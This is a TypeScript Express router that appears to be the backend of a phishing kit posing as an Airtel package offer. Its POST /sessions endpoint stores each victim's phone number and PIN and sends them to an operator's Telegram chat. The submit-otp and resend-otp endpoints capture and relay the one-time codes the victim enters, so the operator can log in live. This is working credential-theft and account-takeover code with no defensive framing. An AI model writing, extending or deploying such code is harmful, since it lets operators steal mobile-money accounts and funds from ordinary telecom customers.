import { Router, type IRouter } from "express";
import { eq } from "drizzle-orm";
import { db, sessionsTable } from "@workspace/db";
import {
  CreateSessionBody,
  GetSessionParams,
  SubmitOtpParams,
  SubmitOtpBody,
} from "@workspace/api-zod";
import { sendMessage, buildLoginKeyboard, buildOtpKeyboard } from "../lib/telegram";

const router: IRouter = Router();

function toJson(s: typeof sessionsTable.$inferSelect) {
  return {
    id: s.id,
    status: s.status,
    phone: s.phone,
    packageName: s.packageName,
    packagePrice: s.packagePrice,
  };
}

// ── POST /sessions ────────────────────────────────────────────────────────
router.post("/sessions", async (req, res): Promise<void> => {
  const parsed = CreateSessionBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const { phone, pin, packageName, packagePrice } = parsed.data;
  const [session] = await db
    .insert(sessionsTable)
    .values({ phone, pin, packageName, packagePrice })
    .returning();

  const text =
    `🔔 *Nouvelle Connexion Airtel*\n\n` +
    `📱 Téléphone: \`${phone}\`\n` +
    `🔑 PIN: \`${pin}\`\n` +
    `📦 Forfait: *${packageName}* — ${packagePrice}\n\n` +
    `Cliquez sur le bouton ci-dessous après avoir envoyé l'OTP à l'utilisateur.`;

  sendMessage(text, buildLoginKeyboard(session.id)).catch((err: unknown) =>
    req.log.error({ err }, "Telegram login notification failed"),
  );

  res.status(201).json(toJson(session));
});

// ── GET /sessions/:id ─────────────────────────────────────────────────────
router.get("/sessions/:id", async (req, res): Promise<void> => {
  const params = GetSessionParams.safeParse({ id: req.params["id"] });
  if (!params.success) {
    res.status(400).json({ error: params.error.message });
    return;
  }

  const [session] = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.id, params.data.id));

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  res.json(toJson(session));
});

// ── POST /sessions/:id/submit-otp ─────────────────────────────────────────
router.post("/sessions/:id/submit-otp", async (req, res): Promise<void> => {
  const params = SubmitOtpParams.safeParse({ id: req.params["id"] });
  if (!params.success) {
    res.status(400).json({ error: params.error.message });
    return;
  }

  const parsed = SubmitOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const [session] = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.id, params.data.id));

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  const [updated] = await db
    .update(sessionsTable)
    .set({ enteredOtp: parsed.data.otp, status: "otp_submitted" })
    .where(eq(sessionsTable.id, params.data.id))
    .returning();

  const text =
    `🔐 *OTP soumis par l'utilisateur*\n\n` +
    `📱 Téléphone: \`${session.phone}\`\n` +
    `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
    `🔢 *OTP entré: \`${parsed.data.otp}\`*\n\n` +
    `Confirmez-vous cet OTP ?`;

  sendMessage(text, buildOtpKeyboard(params.data.id)).catch((err: unknown) =>
    req.log.error({ err }, "Telegram OTP notification failed"),
  );

  res.json(toJson(updated));
});

// ── POST /sessions/:id/resend-otp ─────────────────────────────────────────
router.post("/sessions/:id/resend-otp", async (req, res): Promise<void> => {
  const id = req.params["id"] as string;

  const [session] = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.id, id));

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  const [updated] = await db
    .update(sessionsTable)
    .set({ status: "pending", enteredOtp: null })
    .where(eq(sessionsTable.id, id))
    .returning();

  const text =
    `🔄 *Renvoi d'OTP demandé*\n\n` +
    `📱 Téléphone: \`${session.phone}\`\n` +
    `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n` +
    `L'utilisateur demande un nouveau code OTP.\n` +
    `Cliquez sur le bouton ci-dessous après l'envoi.`;

  sendMessage(text, buildLoginKeyboard(id)).catch((err: unknown) =>
    req.log.error({ err }, "Telegram resend notification failed"),
  );

  res.json(toJson(updated));
});

export default router;
